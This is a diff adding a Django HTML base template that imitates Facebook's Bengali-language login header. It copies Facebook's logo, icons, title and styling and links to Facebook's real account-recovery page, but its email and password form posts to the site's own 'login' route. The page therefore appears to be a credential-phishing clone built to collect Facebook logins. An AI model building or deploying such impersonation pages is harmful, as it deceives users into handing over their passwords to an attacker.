@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico?_nc_x=Ij3Wp8lg5Kz">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title>Facebook - লগ ইন করুন অথবা নিবন্ধন করুন</title>
+    <style>
+        header {
+            background-color: #3b5998;
+            background-image: linear-gradient(#4e69a2, #3b5998 50%);
+            border-bottom: 1px solid #133783;
+            min-height: 42px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-section img {
+            max-width: 100%;
+            width: 150px;
+            margin-bottom: -10px;
+        }
+        @media (max-width: 567px) {
+            .logo-section {
+                margin-left: 35%;
+            }
+            .logo-section  img {
+                width: 90px;
+            }
+        }
+        .group label{
+            display: -ms-flexbox;
+            display: flex;
+            align-items: start;
+            justify-content: start;
+            margin-bottom: 5px;
+            margin-left: 6px;
+            color: #fff;
+            font-size: 13px;
+        }
+        .group input.username, .group input.password{
+            border: none;
+            margin: 0px 6px;
+            width: 150px;
+            background-color: #fff !important;
+            color: #1c1e21 !important;
+        }
+        input:focus {
+            border: none;
+        }
+        .group label.ui {
+            background-color: #4267b2;
+            border-color: #29487d;
+            margin-bottom: -25px;
+        }
+        .group label.ui:hover {
+            background-color: #365899;
+            border-color: #29487d;
+        }
+        .group input.login-btn {
+            background: none;
+            border: 0;
+            color: #fff;
+            cursor: pointer;
+            display: inline-block;
+            font-family: Helvetica, Arial, sans-serif;
+            font-size: 13px;
+            font-weight: bold;
+            line-height: 18px;
+            margin: 0;
+            padding: 2;
+            white-space: nowrap;
+        }
+        .group a {
+            display: block;
+            position: absolute;
+            left: 2%;
+            color: #9cb4d8;
+            font-weight: normal;
+            font-size: 13px;
+        }
+    </style>
+    {% block style %}
+    {% endblock style %}
+  </head>
+  <body>
+    <header>
+        <div class="container">
+            <div class="row d-flex justify-content-between align-items-center py-lg-4">
+                <div class="logo-section  ml-md-4">
+                    <a href="/">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png" alt="facebook">
+                    </a>
+                </div>
+                <div class="form-section mr-4 d-none d-lg-block">
+                   <form class="form-inline" method="POST" action="{% url 'login' %}">
+                       {% csrf_token %}
+                       <div class="group">
+                           <label for="username">ইমেল বা ফোন</label>
+                            <input type="text" class="username" name="username">
+                       </div>
+                       <div class="group position-relative">
+                            <label for="password">পাসওয়ার্ড</label>
+                            <input type="password" class="password" name="password">
+                            <a href="https://www.facebook.com/recover/initiate?lwv=110&ars=royal_blue_bar" class="link">Forgot account?</a>
+                       </div>
+                       <div class="group">
+                            <label class="ui">
+                                    <input value="লগ ইন করুন" class="login-btn" type="submit"/>
+                            </label>
+                       </div>
+                   </form>
+                </div>
+            </div>
+        </div>
+    </header>
+    {% block content %}
+    {% endblock content %}
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+    {% block script %}
+    {% endblock script %}
+  </body>
+</html>
